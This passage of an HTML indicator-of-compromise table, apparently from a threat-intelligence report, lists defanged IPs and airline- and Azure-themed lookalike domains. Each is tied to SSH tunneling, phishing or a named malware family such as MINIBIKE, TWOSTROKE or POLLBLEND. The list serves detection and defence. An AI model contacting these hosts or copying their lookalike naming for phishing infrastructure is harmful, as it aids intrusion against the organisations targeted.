middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">Observed being used for SSH tunneling</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">network</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">4.188.75[.]206</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">Observed being used for SSH tunneling</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">network</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">4.240.113[.]27</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">Observed being used for SSH tunneling</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">network</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">40.119.176[.]233</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">Observed being used for SSH tunneling</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">network</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">46.31.115[.]92</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">Observed being used for SSH tunneling</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">network</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">politicalanorak[.]com</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">Observed being used for SSH tunneling</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">network</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">ac-connection-status105.azurewebsites[.]net</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">GHOSTLINE</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">network</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">acc-cloud-connection.azurewebsites[.]net</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">GHOSTLINE</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">network</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">active-az-check-status45.azurewebsites[.]net</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">POLLBLEND</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">network</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">active-az-check-status675.azurewebsites[.]net</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">POLLBLEND</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">network</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">active-az-status45.azurewebsites[.]net</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">POLLBLEND</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">network</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">active-az-status795.azurewebsites[.]net</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">POLLBLEND</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">network</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">active-internal-log65.azurewebsites[.]net</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">POLLBLEND</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">network</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">active-internal-logs.azurewebsites[.]net</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">POLLBLEND</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">network</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">active-intranet-logs.azurewebsites[.]net</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">POLLBLEND</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">network</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">airbus.usa-careers[.]com</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">Phishing domain for initial access</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">network</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">airlinecontrolsite.uaenorth.cloudapp.azure[.]com</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">DEEPROOT</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">network</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">airlinecontrolsite.westus3.cloudapp.azure[.]com</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">DEEPROOT</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">network</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">airplaneserviceticketings[.]com</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">MINIBIKE</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">network</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">airseatregister.eastus.cloudapp.azure[.]com</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">DEEPROOT</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">network</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">airseatsregister.qatarcentral.cloudapp.azure[.]com</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">DEEPROOT</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">network</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">airseatsregistering.qatarcentral.cloudapp.azure[.]com</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">DEEPROOT</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">network</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">airtravellog[.]com</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">TWOSTROKE</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">network</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">automationagencybusiness.azurewebsites[.]net</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">TWOSTROKE</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">network</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">automationagencybusiness[.]com</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">TWOSTROKE</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">network</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">browsercheckap.azurewebsites[.]net</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">MINIBIKE</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">network</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">codesparkle.eastus.cloudapp.azure[.]com</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">TWOSTROKE</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">network</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">connect-acc-492.azurewebsites[.]net</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">POLLBLEND</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">network</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">connect-acl-492.azurewebsites[.]net</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">POLLBLEND</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">network</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">customerlistchange.eastus.cloudapp.azure[.]com</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">LIGHTRAIL</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">network</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">developercodepro.azurewebsites[.]net</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">TWOSTROKE</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">network</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">developercodevista.azurewebsites[.]net</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">TWOSTROKE</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">network</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">dreamtiniventures.azurewebsites[.]net</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">TWOSTROKE</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">network</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">fdtsprobusinesssolutions.azurewebsites[.]net</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">TWOSTROKE</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">network</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">fdtsprobusinesssolutions[.]com</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">TWOSTROKE</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">network</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">fdtsprobusinesssolutions.eastus.cloudapp.azure[.]com</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">TWOSTROKE</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">network</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">fdtsprobusinesssolutions.northeurope.cloudapp.azure[.]com</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">TWOSTROKE</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">network</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">forcecodestore[.]com</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">TWOSTROKE</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">network</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">hserbhh43.westus3.cloudapp.azure[.]com</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">Observed being used for SSH tunneling</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">network</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">infrasync-ac372.azurewebsites[.]net</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">POLLBLEND</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">network</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">intra-az-check-status45.azurewebsites[.]net</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">POLLBLEND</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">network</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">intra-az-check-status675.azurewebsites[.]net</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">POLLBLEND</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">network</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">intra-az-status45.azurewebsites[.]net</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">POLLBLEND</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">network</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">intra-az-status795.azurewebsites[.]net</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">POLLBLEND</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">network</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">masterflexiblecloud.azurewebsites[.]net</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">TWOSTROKE</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">network</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">mso-internal-log65.azurewebsites[.]net</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">POLLBLEND</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">network</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">mso-internal-logs.azurewebsites[.]net</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">POLLBLEND</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">network</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">mso-intranet-logs.azurewebsites[.]net</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">POLLBLEND</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">network</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">mydocs.qatarcentral.cloudapp.azure[.]com</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">Phishing domain for lateral movement</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">network</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">nx425-win4945.azurewebsites[.]net</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">POLLBLEND</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">network</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">nx4542-win4957.azurewebsites[.]net</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">POLLBLEND</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">network</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">nxlog-crash-1567.azurewebsites[.]net</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">POLLBLEND</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">network</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">nxlog-win-1567.azurewebsites[.]net</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">POLLBLEND</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">network</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">nxversion-win-1567.azurewebsites[.]net</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">POLLBLEND</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">network</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">nxversion-win32-1127.azurewebsites[.]net</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">POLLBLEND</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">network</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">overqatfa.northeurope.cloudapp.azure[.]com</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">Observed being used for SSH tunneling</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">network</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">queuetestapplication.azurewebsites[.]net</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">MINIBIKE</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">network</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">skychain13424.azurewebsites[.]net</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">MINIBIKE</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">network</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">skychain41334.northeurope.cloudapp.azure[.]com</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">MINIBIKE</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">network</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">skychains42745.eastus.cloudapp.azure[.]com</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">MINIBIKE</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">network</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">skyticketgrant.azurewebsites[.]net</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">MINIBIKE</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">network</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 